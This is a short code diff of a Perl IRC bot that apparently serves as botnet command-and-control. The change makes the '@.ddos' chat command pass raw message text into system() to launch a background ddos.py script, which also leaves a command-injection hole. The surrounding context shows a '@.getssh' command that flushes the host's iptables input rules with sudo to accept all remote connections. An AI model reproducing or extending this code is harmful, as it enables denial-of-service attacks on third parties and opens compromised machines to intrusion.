@@ -63,11 +63,13 @@ $irc->on(irc_privmsg => sub {
 
  }
  if ($msg =~ /@.ddos/) {
-  system './ddos.py ' . '@ARGV'; 
+             my $fragment =  substr $msg, 7;
+             system("python3 ddos.py $fragment &");
  }
  if ($msg =~ /@.ddos.stop/) {
-  system 'pkill python'; 
+  system 'pkill python3';
  }
+
   if ($msg =~ /@.getssh/) {
   warn 'Flushing iptables & Accepting all remote connections.';
 system "sudo iptables -F INPUT";
